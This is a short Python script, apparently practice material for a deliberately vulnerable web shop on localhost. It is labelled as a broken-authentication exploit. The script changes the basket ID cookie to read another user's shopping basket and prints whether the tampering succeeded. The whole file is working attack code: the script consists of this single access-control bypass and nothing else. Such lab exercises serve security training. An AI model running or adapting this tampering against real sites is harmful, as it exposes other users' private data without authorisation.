# Broken Authentication Exploit (View Basket)

import requests

url = "http://localhost:3000/basket"
session_cookie = {"bid": "1"}  # Changing basket ID to hijack another user's basket

response = requests.get(url, cookies=session_cookie)

if "items" in response.text:
    print("[+] Basket ID tampered successfully!")
else:
    print("[-] No basket tampering detected.")
